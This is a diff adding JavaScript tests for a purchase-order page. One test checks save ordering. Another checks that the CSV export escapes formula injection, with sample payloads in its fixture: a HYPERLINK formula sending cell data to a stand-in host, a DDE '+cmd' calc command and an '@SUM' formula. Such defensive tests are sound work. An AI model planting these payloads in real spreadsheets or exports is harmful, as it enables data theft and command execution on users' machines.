@@ -453,6 +453,63 @@ const block = (src, page) => sliceSource(src, BLOCK_FROM, BLOCK_TO,
         m1().split === 's2' && m1().po_row_id === 'rNew', JSON.stringify(m1()));
     }
 
+    console.log(`\n[${page}: a save waits for the row it links to be written]`);
+    {
+      // The row a delivery's first quantity (or a move) raises is written
+      // beside the save that links it; a save landing first found no row
+      // behind the link, and a row the merge replaced survived it.
+      const { ctx, state } = sandbox(src, page);
+      ctx.setTimeout = setTimeout;
+      evalSlice(requireFn(src, 'savePurchaseOrders', page), ctx, `savePurchaseOrders from ${page}`);
+      evalSlice('const _drRowWrites = {}; const _DR_WRITE_WAIT_MS = 20000; const _PO_ROW_WRITE_WAIT_MS = 5000;\n'
+        + requireFn(src, '_drWaitForWrites', page), ctx, `_drWaitForWrites from ${page}`);
+      const tick = () => new Promise(r => setTimeout(r, 0));
+      ctx.purchaseOrders.push(order({ id: 'po10', po_number: 'PO-0010', lines: [{ id: 'W1', qty: '3', unit_cost: '2', po_row_id: 'rW1' }] }));
+      state.reply = () => new Promise(() => {});      // the save's answer never matters here
+      ctx._poNoteLineEdit('po10', 'W1', 'qty');
+      ctx._poNoteLinkChange('W1', 'rW1');
+      let written;
+      vm.runInContext('_drRowWrites', ctx).rW1 = new Promise(r => { written = r; });
+      ctx.savePurchaseOrders();
+      await tick();
+      assert('a save linking a row still being written waits for it', state.fetches.length === 0, state.fetches.length);
+      written();
+      await tick(); await tick();
+      assert('  and goes as soon as it is written', state.fetches.length === 1 && /purchase-orders/.test(state.fetches[0].url),
+        JSON.stringify(state.fetches.map(f => f.url)));
+      const { ctx: ctx2, state: state2 } = sandbox(src, page);
+      ctx2.setTimeout = setTimeout;
+      evalSlice(requireFn(src, 'savePurchaseOrders', page), ctx2, `savePurchaseOrders from ${page}`);
+      evalSlice('const _drRowWrites = {}; const _DR_WRITE_WAIT_MS = 20000; const _PO_ROW_WRITE_WAIT_MS = 5000;\n'
+        + requireFn(src, '_drWaitForWrites', page), ctx2, `_drWaitForWrites from ${page}`);
+      ctx2.purchaseOrders.push(order({ id: 'po11', lines: [{ id: 'W2', qty: '3', unit_cost: '2', po_row_id: 'rW2' }] }));
+      state2.reply = () => new Promise(() => {});
+      ctx2._poNoteLineEdit('po11', 'W2', 'qty');
+      ctx2.savePurchaseOrders();
+      assert('  one with no such write goes at once, as before', state2.fetches.length === 1, state2.fetches.length);
+    }
+
+    console.log(`\n[${page}: a job's "Export POs" CSV evaluates no formula]`);
+    {
+      const { ctx } = sandbox(src, page);
+      const link = {};
+      ctx.encodeURIComponent = encodeURIComponent;
+      ctx.document.createElement = () => link;
+      link.click = () => {};
+      evalSlice(requireFn(src, 'exportProjectPOsCSV', page), ctx, `exportProjectPOsCSV from ${page}`);
+      ctx.projectsList.push({ id: 'job2', 'project-name': 'Field 2', dailyRows: [] });
+      ctx.purchaseOrders.push(order({ id: 'po12', po_number: 'PO-0012', title: '=HYPERLINK("https://x.example/?d="&A1,"Sock")',
+        project_id: 'job1', splits: [{ id: 's9', project_id: 'job2', cost_code: '', sub_code: '' }],
+        lines: [{ id: 'X1', split: 's9', invoice_num: "+cmd|' /C calc'!A0", qty: '-2', unit_cost: '5', employee: '@SUM(1+1)' }] }));
+      ctx.exportProjectPOsCSV('job2');
+      const csv = decodeURIComponent(String(link.href || '').replace(/^data:text\/csv;charset=utf-8,/, ''));
+      const cells = csv.split('\n')[1] ? csv.split('\n')[1].match(/"(?:[^"]|"")*"/g) || [] : [];
+      assert('a split order\'s title, invoice # and receiver go out as text, not formulas',
+        cells.length > 0 && !cells.some(c => /^"[=+@]/.test(c)) && cells.some(c => c.startsWith('"\'=HYPERLINK'))
+          && cells.some(c => c.startsWith('"\'+cmd')) && cells.some(c => c.startsWith('"\'@SUM')), csv);
+      assert('  and a plain number is left as it is', cells.some(c => c === '"-2"'), csv);
+    }
+
     console.log(`\n[${page}: deleting a row]`);
     {
       // The page's own row-write functions, against a stub network.
